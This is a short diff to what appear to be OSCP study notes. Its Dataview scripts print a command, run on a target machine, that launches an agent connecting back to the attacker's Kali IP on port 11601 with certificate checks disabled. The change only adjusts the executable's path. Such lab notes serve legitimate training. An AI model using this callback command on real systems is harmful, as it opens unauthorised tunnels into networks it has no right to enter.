@@ -118,7 +118,7 @@ Execute agent in target shell
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
-const command = `agent.exe -connect ${KaliIP}:11601 -ignore-cert`;
+const command = `.\\agent.exe -connect ${KaliIP}:11601 -ignore-cert`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
@@ -129,7 +129,7 @@ CMD
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
-const command = `agent.exe -connect https://${KaliIP}:11601 -ignore-cert`;
+const command = `.\\agent.exe -connect https://${KaliIP}:11601 -ignore-cert`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
